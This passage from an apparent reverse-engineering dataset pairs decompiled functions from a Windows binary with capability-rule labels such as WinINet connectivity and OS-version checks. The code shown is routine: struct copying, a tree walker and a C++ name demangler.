fcn.140018f10(&uStack1080, uStack12, uVar3, uVar4);\n                            }\n                        }\n                        else {\n                            fcn.1400032a2(&uStack472, &uStack473);\n                            uStack1080 = uStack472;\n                            uStack1072 = uStack464;\n                            uStack1064 = uStack456;\n                            Stack1056 = uStack448;\n                            uStack1050 = uStack448 >> 0x30;\n                            uVar1 = Stack432;\n                            Stack1048 = uStack440;\n                            uStack1042 = uStack440 >> 0x30;\n                            uStack1040 = Stack432;\n                            uStack1039 = uVar1 >> 8;\n                            uStack1035 = uVar1 >> 0x28;\n                            uStack1034 = uVar1 >> 0x30;\n                            uStack1033 = uStack425;\n                            uStack1032 = uStack425 >> 8;\n                            uStack1031 = uStack425 >> 0x10;\n                            fcn.140018d40(&uStack1080, uStack12, uVar3, uVar4);\n                        }\n                    }\n                    else {\n                        fcn.140002dce(&uStack632, &uStack633);\n                        uStack1080 = uStack632;\n                        uStack1072 = uStack624;\n                        uStack1064 = uStack616;\n                        Stack1056 = uStack608;\n                        uStack1050 = uStack608 >> 0x30;\n                        Stack1048 = uStack600;\n                        uStack1042 = uStack600 >> 0x30;\n                        uStack1040 = uStack592;\n                        uStack1039 = uStack592 >> 8;\n                        uStack1035 = uStack592 >> 0x28;\n                        uStack1034 = uStack592 >> 0x30;\n                        uStack1033 = uStack592 >> 0x38;\n                        uStack1032 = uStack584;\n                        uStack1031 = uStack584 >> 8;\n                        uStack1029 = uStack584 >> 0x18;\n                        uStack1027 = uStack584 >> 0x28;\n                        uStack1025 = uStack584 >> 0x38;\n                        uStack1024 = uStack576;\n                        uStack1023 = uStack576 >> 8;\n                        uStack1022 = Stack574;\n                        uStack1020 = Stack574 >> 0x10;\n                        uStack1016 = uStack568;\n                        uStack1015 = uStack568 >> 8;\n                        uStack1014 = uStack566;\n                        Stack1012 = uStack566 >> 0x10;\n                        uStack1007 = uStack566 >> 0x38;\n                        fcn.1400191c0(&uStack1080, uStack12, uVar3, uVar4);\n                    }\n                }\n                else {\n                    fcn.140002902(&uStack792, &uStack793);\n                    uStack1080 = uStack792;\n                    uStack1072 = uStack784;\n                    uStack1064 = uStack776;\n                    Stack1056 = uStack768;\n                    uStack1050 = uStack768 >> 0x30;\n                    Stack1048 = uStack760;\n                    uStack1042 = uStack760 >> 0x30;\n                    uStack1040 = uStack752;\n                    uStack1039 = uStack752 >> 8;\n                    uStack1035 = uStack752 >> 0x28;\n                    uStack1034 = uStack752 >> 0x30;\n                    uStack1033 = uStack752 >> 0x38;\n                    uStack1032 = uStack744;\n                    uStack1031 = uStack744 >> 8;\n                    uStack1029 = uStack744 >> 0x18;\n                    uStack1027 = uStack744 >> 0x28;\n                    uStack1025 = uStack744 >> 0x38;\n                    uStack1024 = uStack736;\n                    uStack1023 = uStack736 >> 8;\n                    uStack1022 = uStack736 >> 0x10;\n                    uStack1016 = uStack728;\n                    uStack1015 = uStack728 >> 8;\n                    uStack1014 = uStack728 >> 0x10;\n                    Stack1012 = uStack724;\n                    uStack1007 = uStack724 >> 0x28;\n                    uStack1006 = uStack724 >> 0x30;\n                    fcn.140019390(&uStack1080, uStack12, uVar3, arg4);\n                }\n            }\n        }\n    }\n    else {\n        fcn.14000263a(&uStack904, &uStack905);\n        uStack1000 = uStack904;\n        Stack992 = uStack896;\n        uStack986 = uStack896 >> 0x30;\n        Stack984 = uStack888;\n        uStack978 = uStack888 >> 0x30;\n        uStack976 = uStack880;\n        fcn.140018a90(&uStack1000);\n    }\n    return 0;\n}\n",
        "token_count": 5776
    },
    "1400046c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.1400046c0(ulong arg1, ulong arg2)\n\n{\n    ulong var_10h;\n    ulong var_18h;\n    \n    if ((arg1 == 1) && (arg2 == 0xffff)) {\n        fcn.1400ac9a0(0x140129048);\n        fcn.1400014f0(fcn.1400046a2);\n        *0x140129040 = sub.msvcrt.dll_malloc(*0x1400f93e0);\n    }\n    return;\n}\n",
        "token_count": 119
    },
    "14000496": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nulong fcn.140004960(int64_t arg1, ulong arg2)\n\n{\n    char *pcVar1;\n    \n    if (arg2 == 0) {\n        pcVar1 = *(arg1 + 0x18);\n        if (*pcVar1 == '\\0') {\n            return 0;\n        }\n        *(arg1 + 0x18) = pcVar1 + 1;\n        arg2._0_4_ = *pcVar1;\n    }\n    if (arg2 != 0x68) {\n        if (arg2 != 0x76) {\n            return 0;\n        }\n        fcn.1400048a0(arg1);\n        if (**(arg1 + 0x18) != '_') {\n            return 0;\n        }\n        *(arg1 + 0x18) = *(arg1 + 0x18) + 1;\n    }\n    fcn.1400048a0(arg1);\n    if (**(arg1 + 0x18) != '_') {\n        return 0;\n    }\n    *(arg1 + 0x18) = *(arg1 + 0x18) + 1;\n    return 1;\n}\n",
        "token_count": 260
    },
    "140004ac": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.140004ac0(int64_t arg1, uint *arg2)\n\n{\n    int32_t iVar1;\n    int32_t *arg2_00;\n    \n    if (arg2 != NULL) {\n        do {\n            if (1 < arg2[2]) {\n                return;\n            }\n            iVar1 = *(arg1 + 0x134);\n            if (0x400 < iVar1) {\n                return;\n            }\n            arg2[2] = arg2[2] + 1;\n    // switch table (82 cases) at 0x1400fef44\n            switch(*arg2) {\n            default:\n                goto code_r0x000140004b11;\n            case 4:\n                *(arg1 + 0x16c) = *(arg1 + 0x16c) + 1;\n            case 1:\n            case 2:\n            case 3:\n            case 9:\n            case 10:\n            case 0xb:\n            case 0xc:\n            case 0xd:\n            case 0xe:\n            case 0xf:\n            case 0x10:\n            case 0x11:\n            case 0x12:\n            case 0x13:\n            case 0x14:\n            case 0x15:\n            case 0x16:\n            case 0x17:\n            case 0x19:\n            case 0x1a:\n            case 0x1b:\n            case 0x1c:\n            case 0x1d:\n            case 0x1e:\n            case 0x1f:\n            case 0x20:\n            case 0x21:\n            case 0x22:\n            case 0x25:\n            case 0x26:\n            case 0x28:\n            case 0x29:\n            case 0x2a:\n            case 0x2b:\n            case 0x2d:\n            case 0x2e:\n            case 0x2f:\n            case 0x30:\n            case 0x31:\n            case 0x34:\n            case 0x35:\n            case 0x36:\n            case 0x37:\n            case 0x38:\n            case 0x39:\n            case 0x3a:\n            case 0x3b:\n            case 0x3c:\n            case 0x3d:\n            case 0x3e:\n            case 0x3f:\n            case 0x40:\n            case 0x41:\n            case 0x44:\n            case 0x4a:\n            case 0x4b:\n            case 0x4c:\n            case 0x4d:\n            case 0x4e:\n            case 0x4f:\n            case 0x50:\n            case 0x51:\n                arg2_00 = *(arg2 + 4);\n                goto code_r0x000140004b44;\n            case 7:\n            case 8:\n            case 0x33:\n                arg2 = *(arg2 + 6);\n                break;\n            case 0x23:\n            case 0x24:\n                arg2_00 = *(arg2 + 4);\n                if (*arg2_00 == 5) {\n                    *(arg1 + 0x15c) = *(arg1 + 0x15c) + 1;\n                }\ncode_r0x000140004b44:\n                *(arg1 + 0x134) = iVar1 + 1;\n                fcn.140004ac0(arg1, arg2_00);\n                fcn.140004ac0(arg1, *(arg2 + 6));\n                *(arg1 + 0x134) = *(arg1 + 0x134) + -1;\n                return;\n            case 0x2c:\n            case 0x45:\n            case 0x46:\n            case 0x47:\n            case 0x48:\n                arg2 = *(arg2 + 4);\n            }\n        } while (arg2 != NULL);\n    }\ncode_r0x000140004b11:\n    return;\n}\n",
        "token_count": 909
    },
    "140004b9": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t fcn.140004b90(int32_t *arg1)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = 0;\n    if (arg1 != NULL) {\n        do {\n            if (*arg1 != 0x2f) {\n                return iVar1;\n            }\n            if (*(arg1 + 4) == 0) {\n                return iVar1;\n            }\n            arg1 = *(arg1 + 6);\n            iVar1 = iVar1 + 1;\n        } while (arg1 != NULL);\n    }\n    return iVar1;\n}\n",
        "token_count": 125
    },
    "140004cc": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nbool fcn.140004cc0(uint8_t *arg1)\n\n{\n    uint32_t uVar1;\n    \n    uVar1 = *arg1 - 0x4b;\n    if (uVar1 < 0x28) {\n        return (0xffffff7ffffff7feU >> (uVar1 & 0x3f) & 1) == 0;\n    }\n    if (*arg1 != 0x44) {\n        return false;\n    }\n    return arg1[1] + 0x89 < 2 || (arg1[1] & 0xdf) == 0x4f;\n}\n",
        "token_count": 139
    },
    "1400051c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint * fcn.1400051c0(int64_t arg1, ulong arg2)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int64_t iVar3;\n    char cVar4;\n    int32_t iVar5;\n    ulong arg4;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    uint64_t uVar8;\n    int64_t iVar9;\n    uint *puVar10;\n    ulong uVar11;\n    int32_t iVar12;\n    char *pcVar13;\n    bool bVar14;\n    \n    pcVar13 = *(arg1 + 0x18);\n    if (*pcVar13 != 'S') {\n        return NULL;\n    }\n    *(arg1 + 0x18) = pcVar13 + 1;\n    cVar4 = pcVar13[1];\n    if (cVar4 == '\\0') {\ncode_r0x0001400051e3:\n        uVar6 = *(arg1 + 0x10) & 8;\n        if (((uVar6 != 0) || ((arg2 & 1) == 0)) || (bVar14 = true,  1 < **(arg1 + 0x18) + 0xbdU)) {\n            bVar14 = uVar6 != 0;\n        }\n        pcVar13 = 0x1400ffba0;\n        while (*pcVar13 != cVar4) {\n            pcVar13 = pcVar13 + 0x38;\n            if (pcVar13 == 0x1400ffd28) {\n                return NULL;\n            }\n        }\n        iVar3 = *(pcVar13 + 0x28);\n        iVar5 = *(arg1 + 0x28);\n        iVar1 = *(arg1 + 0x2c);\n        if (iVar3 != 0) {\n            uVar2 = *(pcVar13 + 0x30);\n            if (iVar5 < iVar1) {\n                iVar9 = iVar5;\n                iVar5 = iVar5 + 1;\n                puVar10 = iVar9 * 0x20 + *(arg1 + 0x20);\n                *(puVar10 + 1) = 0;\n                *(arg1 + 0x28) = iVar5;\n                *puVar10 = 0x18;\n                *(puVar10 + 4) = iVar3;\n                puVar10[6] = uVar2;\n            }\n            else {\n                puVar10 = NULL;\n            }\n            *(arg1 + 0x40) = puVar10;\n        }\n        if (bVar14) {\n            uVar11 = *(pcVar13 + 0x18);\n            iVar12 = *(pcVar13 + 0x20);\n        }\n        else {\n            uVar11 = *(pcVar13 + 8);\n            iVar12 = *(pcVar13 + 0x10);\n        }\n        *(arg1 + 0x48) = *(arg1 + 0x48) + iVar12;\n        if (iVar5 < iVar1) {\n            puVar10 = iVar5 * 0x20 + *(arg1 + 0x20);\n            *(puVar10 + 1) = 0;\n            *(arg1 + 0x28) = iVar5 + 1;\n            *puVar10 = 0x18;\n            *(puVar10 + 4) = uVar11;\n            puVar10[6] = iVar12;\n        }\n        else {\n            puVar10 = NULL;\n        }\n        pcVar13 = *(arg1 + 0x18);\n        if (*pcVar13 == 'B') {\n            uVar11 = *(arg1 + 0x40);\n            do {\n                *(arg1 + 0x18) = pcVar13 + 1;\n                arg4 = fcn.1400050c0(arg1);\n                puVar10 = fcn.140004740(arg1, 0x4d, puVar10, arg4);\n                pcVar13 = *(arg1 + 0x18);\n            } while (*pcVar13 == 'B');\n            *(arg1 + 0x40) = uVar11;\n            if (puVar10 == NULL) {\n                return NULL;\n            }\n            iVar5 = *(arg1 + 0x38);\n            if (*(arg1 + 0x3c) <= iVar5) {\n                return NULL;\n            }\n            *(*(arg1 + 0x30) + iVar5 * 8) = puVar10;\n            *(arg1 + 0x38) = iVar5 + 1;\n            return puVar10;\n        }\n        return puVar10;\n    }\n    *(arg1 + 0x18) = pcVar13 + 2;\n    cVar4 = pcVar13[1];\n    if ((cVar4 - 0x30U < 10) || (cVar4 == '_')) {\n        uVar8 = 0;\n        if (cVar4 == '_') goto code_r0x000140005266;\n    }\n    else if (0x19 < cVar4 + 0xbfU) goto code_r0x0001400051e3;\n    uVar6 = 0;\n    do {\n        if (cVar4 - 0x30U < 10) {\n            uVar7 = cVar4 + -0x30 + uVar6 * 0x24;\n        }\n        else {\n            if (0x19 < cVar4 + 0xbfU) {\n                return NULL;\n            }\n            uVar7 = cVar4 + -0x37 + uVar6 * 0x24;\n        }\n        if (uVar7 < uVar6) {\n            return NULL;\n        }\n        pcVar13 = *(arg1 + 0x18);\n        if (*pcVar13 == '\\0') {\n            return NULL;\n        }\n        *(arg1 + 0x18) = pcVar13 + 1;\n        cVar4 = *pcVar13;\n        uVar6 = uVar7;\n    } while (cVar4 != '_');\n    uVar8 = uVar7 + 1;\ncode_r0x000140005266:\n    if (*(arg1 + 0x38) <= uVar8) {\n        return NULL;\n    }\n    return *(*(arg1 + 0x30) + uVar8 * 8);\n}\n",
        "token_count": 1397
    },
    "14000541": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t * fcn.140005410(int64_t arg1)\n\n{\n    uint uVar1;\n    uint uVar2;\n    int32_t *piVar3;\n    char cVar4;\n    int32_t iVar5;\n    uint uVar6;\n    int64_t iVar7;\n    int32_t **ppiVar8;\n    ulong uVar9;\n    int64_t arg4;\n    uint8_t uVar10;\n    uint64_t uVar11;\n    char *arg2;\n    int32_t *piVar12;\n    uint *arg3;\n    char *pcVar13;\n    char *pcVar14;\n    char *pcVar15;\n    int32_t *apiStack64 [2];\n    \n    pcVar13 = *(arg1 + 0x18);\n    iVar5 = fcn.140004cc0(pcVar13);\n    if (iVar5 != 0) {\n        ppiVar8 = fcn.140007540(arg1, apiStack64, 0);\n        if (ppiVar8 == NULL) {\n            return NULL;\n        }\n        if (**(arg1 + 0x18) == 'F') {\n            piVar12 = fcn.140006040(arg1);\n        }\n        else {\n            piVar12 = fcn.140005410(arg1);\n        }\n        *ppiVar8 = piVar12;\n        if (piVar12 == NULL) {\n            return NULL;\n        }\n        if (*piVar12 - 0x1fU < 2) {\n            piVar3 = *(piVar12 + 4);\n            *(piVar12 + 4) = apiStack64[0];\n            apiStack64[0] = *ppiVar8;\n            *ppiVar8 = piVar3;\n        }\n        if (apiStack64[0] == NULL) {\n            return NULL;\n        }\n        iVar5 = *(arg1 + 0x38);\n        if (*(arg1 + 0x3c) <= iVar5) {\n            return NULL;\n        }\n        *(*(arg1 + 0x30) + iVar5 * 8) = apiStack64[0];\n        *(arg1 + 0x38) = iVar5 + 1;\n        return apiStack64[0];\n    }\n    cVar4 = *pcVar13;\n    if ('U' < cVar4) {\n        uVar10 = cVar4 + 0xa6;\n        if (0x20 < uVar10) {\n            return NULL;\n        }\n        uVar11 = 1 << (uVar10 & 0x3f);\n        if ((uVar11 & 0x1f63dff80) != 0) {\n            iVar7 = (cVar4 + -0x61) * 0x20;\n            iVar5 = *(arg1 + 0x28);\n            if (*(arg1 + 0x2c) <= iVar5) {\n                do {\n                    invalidInstructionException();\n                } while( true );\n            }\n            piVar12 = iVar5 * 0x20 + *(arg1 + 0x20);\n            *(piVar12 + 1) = 0;\n            *(arg1 + 0x28) = iVar5 + 1;\n            *(piVar12 + 4) = iVar7 + 0x140100700;\n            iVar5 = *(iVar7 + 0x140100708);\n            *piVar12 = 0x27;\n            *(arg1 + 0x48) = *(arg1 + 0x48) + iVar5;\n            *(arg1 + 0x18) = pcVar13 + 1;\n            return piVar12;\n        }\n        if ((uVar11 & 1) != 0) goto code_r0x0001400055a0;\n        if (uVar10 != 0x1b) {\n            return NULL;\n        }\n        *(arg1 + 0x18) = pcVar13 + 1;\n        uVar9 = fcn.1400050c0(arg1);\n        piVar12 = fcn.140004740(arg1, 0x28, uVar9, 0);\n        apiStack64[0] = piVar12;\n        goto code_r0x0001400055b0;\n    }\n    if (cVar4 < '0') {\n        return NULL;\n    }\n    // switch table (38 cases) at 0x1400ff0e0\n    switch(cVar4 - 0x30U & 0xff) {\n    case 0:\n    case 1:\n    case 2:\n    case 3:\n    case 4:\n    case 5:\n    case 6:\n    case 7:\n    case 8:\n    case 9:\n    case 0x1e:\ncode_r0x0001400055a0:\n        piVar12 = fcn.140007d80(arg1);\n        apiStack64[0] = piVar12;\n        break;\n    default:\n        goto code_r0x0001400054f8;\n    case 0x11:\n        arg2 = pcVar13 + 1;\n        *(arg1 + 0x18) = arg2;\n        if (pcVar13[1] == '_') {\n            iVar7 = 0;\n        }\n        else {\n            pcVar14 = arg2;\n            if (pcVar13[1] - 0x30U < 10) {\n                do {\n                    pcVar15 = pcVar14;\n                    pcVar14 = pcVar15 + 1;\n                    *(arg1 + 0x18) = pcVar14;\n                } while (*pcVar14 - 0x30U < 10);\n                iVar7 = fcn.140004840(arg1, arg2, pcVar15 - pcVar13);\n                if (iVar7 == 0) {\n                    return NULL;\n                }\n                cVar4 = pcVar15[1];\n                arg2 = pcVar14;\n            }\n            else {\n                uVar6 = *(arg1 + 0x4c);\n                *(arg1 + 0x4c) = 1;\n                iVar7 = fcn.140006cb0(arg1);\n                *(arg1 + 0x4c) = uVar6;\n                if (iVar7 == 0) {\n                    return NULL;\n                }\n                arg2 = *(arg1 + 0x18);\n                cVar4 = *arg2;\n            }\n            if (cVar4 != '_') {\n                return NULL;\n            }\n        }\n        *(arg1 + 0x18) = arg2 + 1;\n        uVar9 = fcn.140005410(arg1);\n        piVar12 = fcn.140004740(arg1, 0x2a, iVar7, uVar9);\n        apiStack64[0] = piVar12;\n        break;\n    case 0x13:\n        *(arg1 + 0x18) = pcVar13 + 1;\n        uVar9 = fcn.140005410(arg1);\n        piVar12 = fcn.140004740(arg1, 0x25, uVar9, 0);\n        apiStack64[0] = piVar12;\n        break;\n    case 0x14:\n        *(arg1 + 0x18) = pcVar13 + 1;\n        if (pcVar13[1] == '\\0') {\n            return NULL;\n        }\n        *(arg1 + 0x18) = pcVar13 + 2;\n    // switch table (49 cases) at 0x1400ff178\n        switch(pcVar13[1]) {\n        case 'F':\n            iVar5 = *(arg1 + 0x28);\n            if (*(arg1 + 0x2c) <= iVar5) {\n                do {\n                    invalidInstructionException();\n                } while( true );\n            }\n            piVar12 = iVar5 * 0x20 + *(arg1 + 0x20);\n            *(piVar12 + 1) = 0;\n            *(arg1 + 0x28) = iVar5 + 1;\n            *piVar12 = 0x2c;\n            cVar4 = pcVar13[2];\n            *(piVar12 + 6) = cVar4 - 0x30U < 10;\n            apiStack64[0] = piVar12;\n            if (cVar4 - 0x30U < 10) {\n                fcn.1400048a0(arg1);\n            }\n            iVar7 = fcn.140005410(arg1);\n            *(piVar12 + 4) = iVar7;\n            if (iVar7 == 0) {\n                return NULL;\n            }\n            fcn.1400048a0(arg1);\n            pcVar13 = *(arg1 + 0x18);\n            cVar4 = *pcVar13;\n            if (cVar4 != '\\0') {\n                *(arg1 + 0x18) = pcVar13 + 1;\n                cVar4 = *pcVar13;\n            }\n            *(piVar12 + 0x1a) = cVar4 == 's';\n            return piVar12;\n        default:\n            return NULL;\n        case 'T':\n        case 't':\n            uVar6 = *(arg1 + 0x4c);\n            *(arg1 + 0x4c) = 1;\n            uVar9 = fcn.140006cb0(arg1);\n            *(arg1 + 0x4c) = uVar6;\n            piVar12 = fcn.140004740(arg1, 0x44, uVar9, 0);\n            if (piVar12 == NULL) {\n                return NULL;\n            }\n            pcVar13 = *(arg1 + 0x18);\n            if (*pcVar13 == '\\0') {\n                return NULL;\n            }\n            *(arg1 + 0x18) = pcVar13 + 1;\n            apiStack64[0] = piVar12;\n            if (*pcVar13 != 'E') {\n                return NULL;\n            }\n            goto code_r0x0001400055b9;\n        case 'a':\n            iVar5 = *(arg1 + 0x28);\n            if (*(arg1 + 0x2c) <= iVar5) {\n                return NULL;\n            }\n            *(arg1 + 0x28) = iVar5 + 1;\n            piVar12 = iVar5 * 0x20 + *(arg1 + 0x20);\n            *(piVar12 + 1) = 0;\n            *piVar12 = 0;\n            *(piVar12 + 4) = \"auto\";\n            piVar12[6] = 4;\n            return piVar12;\n        case 'c':\n            iVar5 = *(arg1 + 0x28);\n            if (*(arg1 + 0x2c) <= iVar5) {\n                return NULL;\n            }\n            *(arg1 + 0x28) = iVar5 + 1;\n            piVar12 = iVar5 * 0x20 + *(arg1 + 0x20);\n            *(piVar12 + 1) = 0;\n            *piVar12 = 0;\n            *(piVar12 + 4) = \"decltype(auto)\";\n            piVar12[6] = 0xe;\n            return piVar12;\n        case 'd':\n            iVar5 = *(arg1 + 0x28);\n            if (*(arg1 + 0x2c) <= iVar5) {\n                do {\n                    invalidInstructionException();\n                } while( true );\n            }\n            piVar12 = iVar5 * 0x20 + *(arg1 + 0x20);\n            *(piVar12 + 1) = 0;\n            *(arg1 + 0x28) = iVar5 + 1;\n            *piVar12 = 0x27;\n            *(piVar12 + 4) = 0x140100a60;\n            *(arg1 + 0x48) = *(arg1 + 0x48) + 9;\n            return piVar12;\n        case 'e':\n            iVar5 = *(arg1 + 0x28);\n            if (*(arg1 + 0x2c) <= iVar5) {\n                do {\n                    invalidInstructionException();\n                } while( true );\n            }\n            piVar12 = iVar5 * 0x20 + *(arg1 + 0x20);\n            *(piVar12 + 1) = 0;\n            *(arg1 + 0x28) = iVar5 + 1;\n            *piVar12 = 0x27;\n            *(piVar12 + 4) = 0x140100a80;\n            *(arg1 + 0x48) = *(arg1 + 0x48) + 10;\n            return piVar12;\n        case 'f':\n            iVar5 = *(arg1 + 0x28);\n            if (*(arg1 + 0x2c) <= iVar5) {\n                do {\n                    invalidInstructionException();\n                } while( true );\n            }\n            piVar12 = iVar5 * 0x20 + *(arg1 + 0x20);\n            *(piVar12 + 1) = 0;\n            *(arg1 + 0x28) = iVar5 + 1;\n            *piVar12 = 0x27;\n            *(piVar12 + 4) = 0x140100a40;\n            *(arg1 + 0x48) = *(arg1 + 0x48) + 9;\n            return piVar12;\n        case 'h':\n            iVar5 = *(arg1 + 0x28);\n            if (*(arg1 + 0x2c) <= iVar5) {\n                do {\n                    invalidInstructionException();\n                } while( true );\n            }\n            piVar12 = iVar5 * 0x20 + *(arg1 + 0x20);\n            *(piVar12 + 1) = 0;\n            *(arg1 + 0x28) = iVar5 + 1;\n            *piVar12 = 0x27;\n            *(piVar12 + 4) = 0x140100aa0;\n            *(arg1 + 0x48) = *(arg1 + 0x48) + 4;\n            return piVar12;\n        case 'i':\n            iVar5 = *(arg1 + 0x28);\n            if (*(arg1 + 0x2c) <= iVar5) {\n                do {\n                    invalidInstructionException();\n                } while( true );\n            }\n            piVar12 = iVar5 * 0x20 + *(arg1 + 0x20);\n            *(piVar12 + 1) = 0;\n            *(arg1 + 0x28) = iVar5 + 1;\n            *piVar12 = 0x27;\n            *(piVar12 + 4) = 0x140100b00;\n            *(arg1 + 0x48) = *(arg1 + 0x48) + 8;\n            return piVar12;\n        case 'n':\n            iVar5 = *(arg1 + 0x28);\n            if (*(arg1 + 0x2c) <= iVar5) {\n                do {\n                    invalidInstructionException();\n                } while( true );\n            }\n            piVar12 = iVar5 * 0x20 + *(arg1 + 0x20);\n            *(piVar12 + 1) = 0;\n            *(arg1 + 0x28) = iVar5 + 1;\n            *piVar12 = 0x27;\n            *(piVar12 + 4) = 0x140100b20;\n            *(arg1 + 0x48) = *(arg1 + 0x48) + 0x11;\n            return piVar12;\n        case 'p':\n            uVar9 = fcn.140005410(arg1);\n            piVar12 = fcn.140004740(arg1, 0x4c, uVar9, 0);\n            apiStack64[0] = piVar12;\n            break;\n        case 's':\n            iVar5 = *(arg1 + 0x28);\n            if (*(arg1 + 0x2c) <= iVar5) {\n                do {\n                    invalidInstructionException();\n                } while( true );\n            }\n            piVar12 = iVar5 * 0x20 + *(arg1 + 0x20);\n            *(piVar12 + 1) = 0;\n            *(arg1 + 0x28) = iVar5 + 1;\n            *piVar12 = 0x27;\n            *(piVar12 + 4) = 0x140100ae0;\n            *(arg1 + 0x48) = *(arg1 + 0x48) + 8;\n            return piVar12;\n        case 'u':\n            iVar5 = *(arg1 + 0x28);\n            if (*(arg1 + 0x2c) <= iVar5) {\n                do {\n                    invalidInstructionException();\n                } while( true );\n            }\n            piVar12 = iVar5 * 0x20 + *(arg1 + 0x20);\n            *(piVar12 + 1) = 0;\n            *(arg1 + 0x28) = iVar5 + 1;\n            *piVar12 = 0x27;\n            *(piVar12 + 4) = 0x140100ac0;\n            *(arg1 + 0x48) = *(arg1 + 0x48) + 7;\n            return piVar12;\n        case 'v':\n            if (pcVar13[2] == '_') {\n                uVar6 = *(arg1 + 0x4c);\n                *(arg1 + 0x4c) = 1;\n                *(arg1 + 0x18) = pcVar13 + 3;\n                arg3 = fcn.140006cb0(arg1);\n                *(arg1 + 0x4c) = uVar6;\n                if (arg3 == NULL) {\n                    return NULL;\n                }\n            }\n            else {\n                iVar5 = *(arg1 + 0x28);\n                if (*(arg1 + 0x2c) <= iVar5) {\n                    return NULL;\n                }\n                arg3 = iVar5 * 0x20 + *(arg1 + 0x20);\n                *(arg3 + 1) = 0;\n                *(arg1 + 0x28) = iVar5 + 1;\n                *arg3 = 0x43;\n                uVar6 = fcn.1400048a0(arg1);\n                arg3[4] = uVar6;\n            }\n            if (**(arg1 + 0x18) != '_') {\n                return NULL;\n            }\n            *(arg1 + 0x18) = *(arg1 + 0x18) + 1;\n            uVar9 = fcn.140005410(arg1);\n            piVar12 = fcn.140004740(arg1, 0x2d, arg3, uVar9);\n            apiStack64[0] = piVar12;\n        }\n        break;\n    case 0x16:\n        piVar12 = fcn.140006040(arg1);\n        apiStack64[0] = piVar12;\n        break;\n    case 0x17:\n        *(arg1 + 0x18) = pcVar13 + 1;\n        uVar9 = fcn.140005410(arg1);\n        piVar12 = fcn.140004740(arg1, 0x26, uVar9, 0);\n        apiStack64[0] = piVar12;\n        break;\n    case 0x1d:\n        *(arg1 + 0x18) = pcVar13 + 1;\n        iVar7 = fcn.140005410(arg1);\n        if (iVar7 == 0) {\n            return NULL;\n        }\n        arg4 = fcn.140005410(arg1);\n        if (arg4 == 0) {\n            return NULL;\n        }\n        piVar12 = fcn.140004740(arg1, 0x2b, iVar7, arg4);\n        apiStack64[0] = piVar12;\n        break;\n    case 0x1f:\n        *(arg1 + 0x18) = pcVar13 + 1;\n        uVar9 = fcn.140005410(arg1);\n        piVar12 = fcn.140004740(arg1, 0x24, uVar9, 0);\n        apiStack64[0] = piVar12;\n        break;\n    case 0x20:\n        *(arg1 + 0x18) = pcVar13 + 1;\n        uVar9 = fcn.140005410(arg1);\n        piVar12 = fcn.140004740(arg1, 0x22, uVar9, 0);\n        apiStack64[0] = piVar12;\n        break;\n    case 0x22:\n        *(arg1 + 0x18) = pcVar13 + 1;\n        uVar9 = fcn.140005410(arg1);\n        piVar12 = fcn.140004740(arg1, 0x23, uVar9, 0);\n        apiStack64[0] = piVar12;\n        break;\n    case 0x23:\n        if ((pcVar13[1] - 0x30 < 0x30) && ((0xffff78000001fc00U >> (pcVar13[1] - 0x30 & 0x3f) & 1) == 0)) {\n            piVar12 = fcn.1400051c0(arg1, 0);\n            if (**(arg1 + 0x18) != 'I') {\n                return piVar12;\n            }\n            *(arg1 + 0x18) = *(arg1 + 0x18) + 1;\n            apiStack64[0] = piVar12;\n            uVar9 = fcn.140006a20(arg1);\n            goto code_r0x0001400056ef;\n        }\n        piVar12 = fcn.140007d80(arg1);\n        if (piVar12 == NULL) {\n            return NULL;\n        }\n        apiStack64[0] = piVar12;\n        if (*piVar12 == 0x18) {\n            return piVar12;\n        }\n        goto code_r0x0001400055b9;\n    case 0x24:\n        piVar12 = fcn.140004f80(arg1);\n        pcVar13 = *(arg1 + 0x18);\n        apiStack64[0] = piVar12;\n        if (*pcVar13 == 'I') {\n            if (*(arg1 + 0x50) == 0) {\n                if (piVar12 == NULL) {\n                    return NULL;\n                }\n                iVar5 = *(arg1 + 0x38);\n                if (*(arg1 + 0x3c) <= iVar5) {\n                    return NULL;\n                }\n                uVar9 = 0;\n                *(*(arg1 + 0x30) + iVar5 * 8) = piVar12;\n                *(arg1 + 0x38) = iVar5 + 1;\n                if (*pcVar13 + 0xb7U < 2) {\n                    *(arg1 + 0x18) = pcVar13 + 1;\n                    uVar9 = fcn.140006a20(arg1);\n                }\n            }\n            else {\n                uVar6 = *(arg1 + 0x28);\n                uVar1 = *(arg1 + 0x38);\n                *(arg1 + 0x18) = pcVar13 + 1;\n                uVar2 = *(arg1 + 0x48);\n                uVar9 = fcn.140006a20(arg1);\n                if (**(arg1 + 0x18) != 'I') {\n                    *(arg1 + 0x18) = pcVar13;\n                    *(arg1 + 0x28) = uVar6;\n                    